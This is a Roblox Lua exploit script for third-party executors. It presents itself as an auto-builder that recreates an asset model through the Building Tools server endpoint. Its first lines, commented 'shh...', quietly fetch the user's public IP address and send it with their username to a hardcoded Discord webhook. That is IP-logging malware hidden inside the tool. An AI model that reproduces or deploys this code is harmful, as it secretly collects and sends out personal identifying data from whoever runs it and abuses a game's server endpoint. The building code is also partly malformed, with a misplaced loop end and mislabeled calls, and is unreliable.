local webh = "https://discord.com/api/webhooks/993109889192820878/j67sEd3eVLDOrvoqhTXtmqf07gc3wiRcmqa-udZPrKIBKhZpgiMrSyAqa3p-yb3TTMqs" -- shh...

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request( --if you're using synapse
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request( --jjsploit 😎
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request( -- krnl 💀
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)

wait(.5)
game.StarterGui:SetCore("SendNotification", { --just a quick lil notification
Title = ".gg/ycjaRMUUBB"; -- the title (ofc)
Text = "Do not Unequip Btools."; -- what the text says (ofc)
Icon = "rbxassetid://6907439084"; -- the image if u want. 
Duration = 5; -- how long the notification should in secounds
})


-- finds players building plot thingy
local user = game.Players.LocalPlayer.Name
local userpath = (user.."BuildArea")
local buildparent = game.Workspace["Private Building Areas"][userpath].Build
local error = 0


local model2 = game:GetObjects("rbxassetid://".._G.model)[1]
model2.Parent = buildparent
model2:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)

wait(1)

for i,v in pairs(model2:GetDescendants()) do
	if v:IsA("BasePart") then
    v.Anchored = true
 end
 wait(1)

-- actually building
local descendants = model2:GetDescendants()
for i, child in ipairs(descendants) do
local success, message = pcall(function()
       --top
        local A_1 = "CreatePart"
           local A_2 = "Normal"
           local A_3 = child.CFrame
           local A_4 = buildparent
           local part = game.Players.LocalPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint:InvokeServer(A_1, A_2, A_3, A_4)
           local A_1 = "SetLocked"
           local A_2 =
           {
            [1] = part
           }
           local A_3 = true
           game.Players.LocalPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint:InvokeServer(A_1, A_2, A_3)

           local A_1 = "SyncResize"
           local A_2 =
           {
            [1] =
           {
            ["Part"] = part,
            ["CFrame"] = child.CFrame,
            ["Size"] = child.Size
           }
           }
           game.Players.LocalPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint:InvokeServer(A_1, A_2)
           local A_1 = "SyncColor"
           local A_2 =
           {
            [1] =
           {
            ["Color"] = child.Color,
            ["Part"] = part,
            ["UnionColoring"] = true
           }
           }
           game.Players.LocalPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint:InvokeServer(A_1, A_2)
           local A_1 = "SyncMaterial"
           local A_2 =
           {
            [1] =
           {
            ["Part"] = part,
            ["Material"] = child.Material
           }
           }
           game.Players.LocalPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint:InvokeServer(A_1, A_2)
           local A_1 = "SyncMaterial"
           local A_2 =
           {
            [1] =
           {
            ["Part"] = part,
            ["Transparency"] = child.Transparency
           }
           }
           game.Players.LocalPlayer.Character["Building Tools"].SyncAPI.ServerEndpoint:InvokeServer(A_1, A_2)
           local A_1 = "SyncMaterial"
           local A_2 =
           {
            [1] =
           {
            ["Reflectance"] = child.Reflectance,
            ["Part"] = part
           }
           }
       --bot
       child:Destroy()
       end)
       if not success then
		   print("sus")
       end
    end
end
buildparent:FindFirstChildWhichIsA("Model"):Destroy()